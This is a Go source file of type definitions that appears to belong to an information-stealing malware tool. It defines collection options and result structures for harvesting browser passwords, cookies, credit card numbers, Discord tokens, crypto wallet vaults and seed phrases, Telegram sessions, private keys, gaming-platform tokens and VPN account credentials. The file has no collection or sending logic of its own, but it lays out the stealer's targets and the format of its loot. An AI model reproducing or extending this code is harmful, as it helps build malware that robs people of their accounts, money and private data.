package types

type BrowserConfig struct {
	Name         string
	UserDataPath string
	ProcessName  string
	UseAppData   bool
	IsFirefox    bool
	FlatProfile  bool
}

type ProfileInfo struct {
	Name string
	Path string
}

type CollectOptions struct {
	Browsers    bool `json:"browsers"`
	Passwords   bool `json:"passwords"`
	Cookies     bool `json:"cookies"`
	Autofill    bool `json:"autofill"`
	History     bool `json:"history"`
	Bookmarks   bool `json:"bookmarks"`
	CreditCards bool `json:"creditCards"`
	Discord     bool `json:"discord"`
	Files       bool `json:"files"`
	Wallets     bool `json:"wallets"`
	Telegram    bool `json:"telegram"`
	Keys        bool `json:"keys"`
	Apps        bool `json:"apps"`
	Gaming      bool `json:"gaming"`
	VPNs        bool `json:"vpns"`
}

type ResolvedKeys struct {
	V10 []byte
	V20 []byte
}

type PasswordResult struct {
	URL      string `json:"url"`
	Username string `json:"username"`
	Password string `json:"password"`
	Browser  string `json:"browser"`
	Profile  string `json:"profile"`
}

type CookieResult struct {
	Host       string `json:"host"`
	Name       string `json:"name"`
	Value      string `json:"value"`
	Path       string `json:"path"`
	Secure     bool   `json:"secure"`
	HTTPOnly   bool   `json:"httpOnly"`
	ExpiresUTC int64  `json:"expiresUtc"`
	Browser    string `json:"browser"`
	Profile    string `json:"profile"`
}

type AutofillResult struct {
	Name        string `json:"name"`
	Value       string `json:"value"`
	DateCreated int64  `json:"dateCreated"`
	Browser     string `json:"browser"`
	Profile     string `json:"profile"`
}

type HistoryResult struct {
	URL            string `json:"url"`
	Title          string `json:"title"`
	VisitTimeUnix  int64  `json:"visitTimeUnix"`
	VisitCount     int64  `json:"visitCount"`
	LastVisitTime  int64  `json:"lastVisitTime"`
	Browser        string `json:"browser"`
	Profile        string `json:"profile"`
}

type BookmarkResult struct {
	Name    string `json:"name"`
	URL     string `json:"url"`
	Type    string `json:"type"`
	Browser string `json:"browser"`
	Profile string `json:"profile"`
}

type CreditCardResult struct {
	NameOnCard       string `json:"nameOnCard"`
	ExpirationMonth  int    `json:"expirationMonth"`
	ExpirationYear   int    `json:"expirationYear"`
	CardNumber       string `json:"cardNumber"`
	Nickname         string `json:"nickname"`
	Browser          string `json:"browser"`
	Profile          string `json:"profile"`
}

type DiscordTokenResult struct {
	Token  string `json:"token"`
	Source string `json:"source"`
}

type FileResult struct {
	Path     string   `json:"path"`
	Name     string   `json:"name"`
	Ext      string   `json:"ext"`
	Size     int64    `json:"size"`
	Modified int64    `json:"modified"`
	Dir      string   `json:"dir"`
	Tags     []string `json:"tags,omitempty"`
}

type ExtensionResult struct {
	ExtID    string `json:"extId"`
	Name     string `json:"name"`
	Version  string `json:"version"`
	Browser  string `json:"browser"`
	Profile  string `json:"profile"`
	Path     string `json:"path"`
	Category string `json:"category,omitempty"`
}

type WalletResult struct {
	Name      string   `json:"name"`
	Type      string   `json:"type"`
	Path      string   `json:"path"`
	Files     int      `json:"files"`
	Size      int64    `json:"size"`
	Addresses []string `json:"addresses,omitempty"`
	VaultData string   `json:"vaultData,omitempty"`
}

type AppCredentialResult struct {
	Application string `json:"application"`
	Host        string `json:"host,omitempty"`
	Port        int    `json:"port,omitempty"`
	Username    string `json:"username,omitempty"`
	Password    string `json:"password,omitempty"`
	Protocol    string `json:"protocol,omitempty"`
	Extra       string `json:"extra,omitempty"`
}

type CollectionResult struct {
	Passwords      []PasswordResult      `json:"passwords,omitempty"`
	Cookies        []CookieResult        `json:"cookies,omitempty"`
	Autofill       []AutofillResult      `json:"autofill,omitempty"`
	History        []HistoryResult       `json:"history,omitempty"`
	Bookmarks      []BookmarkResult      `json:"bookmarks,omitempty"`
	CreditCards    []CreditCardResult    `json:"creditCards,omitempty"`
	DiscordTokens  []DiscordTokenResult  `json:"discordTokens,omitempty"`
	Files          []FileResult          `json:"files,omitempty"`
	Extensions     []ExtensionResult     `json:"extensions,omitempty"`
	Wallets        []WalletResult        `json:"wallets,omitempty"`
	Telegram       []TelegramResult      `json:"telegram,omitempty"`
	Keys           []KeyResult           `json:"keys,omitempty"`
	AppCredentials []AppCredentialResult  `json:"appCredentials,omitempty"`
	Gaming         *GamingResult         `json:"gaming,omitempty"`
	VPNs           *VPNResult            `json:"vpns,omitempty"`
	Errors         []string              `json:"errors,omitempty"`
}

type TelegramResult struct {
	Account string `json:"account"`
	Path    string `json:"path"`
	Files   int    `json:"files"`
	Size    int64  `json:"size"`
}

type KeyResult struct {
	Type    string `json:"type"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Size    int64  `json:"size"`
	Content string `json:"content,omitempty"`
}

type SeedResult struct {
	Source string `json:"source"`
	Path   string `json:"path"`
	Phrase string `json:"phrase"`
	Words  int    `json:"words"`
}

type GameInfo struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Installed bool   `json:"installed"`
	Running   bool   `json:"running"`
}

type SteamResult struct {
	SteamPath  string     `json:"steamPath,omitempty"`
	AutoLogin  string     `json:"autoLogin,omitempty"`
	RememberPW bool       `json:"rememberPw,omitempty"`
	Account    string     `json:"account,omitempty"`
	Token      string     `json:"token,omitempty"`
	SSFNFiles  []string   `json:"ssfnFiles,omitempty"`
	Games      []GameInfo `json:"games,omitempty"`
}

type BattleNetResult struct {
	Path string `json:"path"`
	Name string `json:"name"`
}

type EpicResult struct {
	Path string `json:"path"`
	Name string `json:"name"`
}

type RiotResult struct {
	Path string `json:"path"`
	Name string `json:"name"`
}

type UplayResult struct {
	Path string `json:"path"`
	Name string `json:"name"`
}

type GamingResult struct {
	Steam     *SteamResult      `json:"steam,omitempty"`
	BattleNet []BattleNetResult `json:"battleNet,omitempty"`
	Epic      []EpicResult      `json:"epic,omitempty"`
	Riot      []RiotResult      `json:"riot,omitempty"`
	Uplay     []UplayResult     `json:"uplay,omitempty"`
}

type NordVPNResult struct {
	Version  string `json:"version"`
	Username string `json:"username"`
	Password string `json:"password"`
}

type WireGuardResult struct {
	Name      string `json:"name"`
	Interface string `json:"interface,omitempty"`
	Peer      string `json:"peer,omitempty"`
	Endpoint  string `json:"endpoint,omitempty"`
}

type OpenVPNResult struct {
	Name string `json:"name"`
	Path string `json:"path"`
}

type MullvadResult struct {
	AccountNumber string `json:"accountNumber"`
	SettingsPath  string `json:"settingsPath"`
	Content       string `json:"content,omitempty"`
}

type VPNResult struct {
	NordVPN   []NordVPNResult   `json:"nordvpn,omitempty"`
	WireGuard []WireGuardResult `json:"wireguard,omitempty"`
	OpenVPN   []OpenVPNResult   `json:"openvpn,omitempty"`
	Mullvad   []MullvadResult   `json:"mullvad,omitempty"`
}
